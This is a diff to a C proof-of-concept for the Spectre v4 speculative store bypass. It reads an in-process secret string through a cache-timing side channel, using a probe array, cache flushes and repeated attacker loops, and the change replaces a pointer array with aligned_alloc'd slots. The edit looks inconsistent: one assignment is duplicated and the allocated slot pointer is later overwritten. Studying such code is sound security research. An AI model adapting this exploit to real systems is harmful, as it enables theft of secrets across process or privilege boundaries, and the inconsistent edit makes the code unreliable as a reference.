@@ -9,7 +9,7 @@
 #define MAX_TRIES 5000
 #define CACHE_HIT_THRESHOLD 190
 #define REPEAT_16(x) x x x x x x x x x x x x x x x x
-#define REPEAT_10(x) x x x x x x x x x x 
+#define REPEAT_20(x) x x x x x x x x x x x x x x x x x x x x 
 
 #define NOPS(n) \
     asm volatile( \
@@ -22,8 +22,8 @@
 
 
 
-unsigned char** memory_slot_ptr[256] __attribute__((aligned(4096)));
-unsigned char* memory_slot[256] __attribute__((aligned(4096)));
+unsigned char** memory_slot_ptr __attribute__((aligned(4096)));
+unsigned char* memory_slot __attribute__((aligned(4096)));
 
 unsigned char secret_key[] = "PASSWORD_SPECTRE";
 unsigned char public_key[] = "################";
@@ -64,10 +64,10 @@ static inline __attribute__((always_inline)) void measure_time() {
 	}
 
 static inline __attribute__((always_inline)) void spectre_v4(size_t idx) {
-	unsigned char **memory_slot_slow_ptr = *memory_slot_ptr;
+	unsigned char **memory_slot_slow_ptr = memory_slot_ptr;
 	NOPS(200);
 	*memory_slot_slow_ptr = public_key;
-	tmp = probe[(*memory_slot)[idx] << 12];
+	tmp = probe[memory_slot[idx] << 12];
 	//measure_time();
 }
 
@@ -78,10 +78,10 @@ static inline __attribute__((always_inline)) void attacker_function(int idx) {
 
 		int results[256] = {0};
 		volatile unsigned char pick = 0;
-		REPEAT_10(
-		for (int tries = 0; tries < MAX_TRIES / 10; tries++) {
+		REPEAT_20(
+		for (int tries = 0; tries < MAX_TRIES / 20; tries++) {
 
-			*memory_slot = secret_key;
+			memory_slot = secret_key;
 
 			cacheflush(memory_slot_ptr);
 			for (int i = 0; i < 256; i++) {
@@ -122,9 +122,10 @@ int main(void) {
 	probe = (unsigned char *)mmap(0, 4096 * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
 	memset(probe, 0, sizeof(uint8_t) * 256 * 4096);
 	password = (unsigned char *)malloc(sizeof(unsigned char) * LEN);
-	for(int j = 0; j < 256; j++){
-		memory_slot_ptr[j] = &memory_slot[j];
-	}
+ memory_slot = (unsigned char*) aligned_alloc(4096, 4096); 
+    memory_slot_ptr = (unsigned char**) aligned_alloc(4096, sizeof(unsigned char*));
+    *memory_slot_ptr = memory_slot;
+	*memory_slot_ptr = memory_slot;
 
 	int idx = 0;
 	REPEAT_16(
